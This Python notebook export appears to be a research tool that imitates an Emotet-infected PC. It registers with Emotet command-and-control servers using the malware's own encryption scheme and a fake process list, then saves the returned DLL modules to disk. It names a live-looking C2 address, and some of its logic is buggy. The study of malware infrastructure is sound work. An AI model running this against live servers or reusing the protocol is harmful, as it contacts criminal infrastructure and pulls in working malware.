#!/usr/bin/python3
# coding: utf-8

# In[331]:

from Crypto.Util.py3compat import *
import requests
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
#from Crypto.Util.Padding import pad
from hashlib import sha1
import base64
import struct
import zlib
import argparse

# In[195]:


# Public Key
# To save time, can be extracted with CAPE (https://cape.contextis.com/submit/status/64123/)
pubkey = """-----BEGIN PUBLIC KEY----- 
MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAMPLgcO0RQdJg/LTgiku57nH4KcLwHCx S0lbynOUhHhKjTnmENrMA2idUbK6hI0JRZtii9oJSlb3e5NZiCK+Qr/NB2u7ZNRc hG87aibm0ndS9xKDRXcmWwaQkF0PFuOHpwIDAQAB 
-----END PUBLIC KEY-----
"""


# In[196]:


# Import Public Key and Initiate PCKS1_OAEP cipher
recipient_key = RSA.importKey(pubkey)
cipher_rsa = PKCS1_OAEP.new(recipient_key)


# In[270]:


# Generate AES key, will be used for both encryption and decryption
aes_key = get_random_bytes(16)


# In[271]:


def pad(data_to_pad, block_size, style='pkcs7'):
    """Apply standard padding.
    :Parameters:
      data_to_pad : byte string
        The data that needs to be padded.
      block_size : integer
        The block boundary to use for padding. The output length is guaranteed
        to be a multiple of ``block_size``.
      style : string
        Padding algorithm. It can be *'pkcs7'* (default), *'iso7816'* or *'x923'*.
    :Return:
      The original data with the appropriate padding added at the end.
    """

    padding_len = block_size-len(data_to_pad)%block_size
    if style == 'pkcs7':
        padding = bchr(padding_len)*padding_len
    elif style == 'x923':
        padding = bchr(0)*(padding_len-1) + bchr(padding_len)
    elif style == 'iso7816':
        padding = bchr(128) + bchr(0)*(padding_len-1)
    else:
        raise ValueError("Unknown padding style")
    return data_to_pad + padding


# Encryption function
# Pad with AES PKCS7, encrypt with AES 128 CBC, IV is \x00
# Hash content with SHA1
# Encrypt AES key with RSA Public Key
# Base64 encode everything
def encrypt_req(req):
    aes = AES.new(aes_key, AES.MODE_CBC, b"\x00"*16)
    enc_req = aes.encrypt(pad(req, 16))
    h = sha1(req)
    enc_key = cipher_rsa.encrypt(aes_key)
    return base64.b64encode(enc_key+h.digest()+enc_req)


# In[380]:


packet_header = b"\x08\x10\x12\x9f\x02"
packet_content = b""
packet_content += b"\x08\x00\x12\x18"
packet_content += b"DESKTOPX2C3IQHO_00000000"
packet_content += b"\x18\xb9\xdb\x06 \x01-\xc5\x89\x0b\x0e2\x99\x03"
packet_content += b"PE-bear.exe,ApplicationFrameHost.exe,x32dbg.exe,SearchIndexer.exe,RuntimeBroker.exe,SearchUI.exe,ShellExperienceHost.exe,explorer.exe,ctfmon.exe,taskhostw.exe,sihost.exe,msdtc.exe,WmiPrvSE.exe,dllhost.exe,VGAuthService.exe,SecurityHealthService.exe,vmtoolsd.exe,spoolsv.exe,Memory Compression,vmacthlp.exe,dwm.exe,fontdrvhost.exe,svchost.exe,lsass.exe,services.exe,winlogon.exe,wininit.exe,csrss.exe,smss.exe,"
packet_content += b":\x00"


# In[381]:


packet = packet_header + zlib.compress(packet_content)


# In[382]:

parser = argparse.ArgumentParser()
parser.add_argument("-ImpIP", help = "Import list of C2 IPs", required=False)
args, leftovers = parser.parse_known_args()
if args.ImpIP is not None:
  #Filename = input("Please enter path to IP list: ")
  with open(args.ImpIP) as f:
      Data = f.readlines()
  Data = [x.strip() for x in Data]

i = 0

for x in Data:
  c2_ip = Data[i]
  i += 1
  # print(c2_ip)
  try:
#c2_ip = "136.243.117.85:8080"


# In[383]:


    headers = {
      "User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
      "Referer": "http://{}/cookies/enable/iplk/".format(c2_ip),
      "DNT":"1",
      "Connection":"Keep-Alive",
      "Cache-Control":"no-cache"
    }  


# In[360]:


    r = requests.post(url="http://{}/merge/".format(c2_ip),
                         headers=headers,
                         data={"GZpujF5pBD4zzU":encrypt_req(packet)},
                         verify=False,
                         stream=True)

    #print(r.content)
  
    len(r.content)


# In[388]:


    cipher_aes = AES.new(aes_key, AES.MODE_CBC, b"\x00"*16)
    decompressed_data = cipher_aes.decrypt(r.content[116:])

 
    struct.unpack("I", decompressed_data[:4])[0]


# In[390]:

 
    decompressed_data = zlib.decompress(decompressed_data[4:])



 

# In[391]:


# Write down decompressed data just in case

    if decompressed_data != 0:
      with open("trial2.dec.bin", "wb") as f:
         f.write(decompressed_data)



# In[392]:


# Because I am not sure of protobuf structure, we gonna extract modules dumb way
# Get offsets to DOS header
    offsets = []
    for y in range(0, len(decompressed_data)):
        if decompressed_data[y:y+5] == b"MZ\x90\x00\x03":
            offsets.append(y)
        offsets.append(len(decompressed_data))


# In[393]:


    offsets


# In[394]:


# Function that will write data
    def write_module(start, end):
        with open("emotet_module_{}_{}.dll".format(start, end), "wb") as f:
            f.write(decompressed_data[start:end])


# In[395]:


    for x in range(0, len(offsets)-1):
        write_module(offsets[x], offsets[x+1])


# In[ ]:


  except requests.exceptions.ConnectionError:
    i+=1
    r.status_code = "Connection refused"

  except requests.exceptions.Timeout:
    i += 1
    r.status_code = "Connection timeout"
   # print(r.content)

  except IndexError:
    i = 0
  except struct.error:
    print('struct error')

  except:
    print('decompress error')
    decompressed_data =b"\x00\x00\x00\x00"






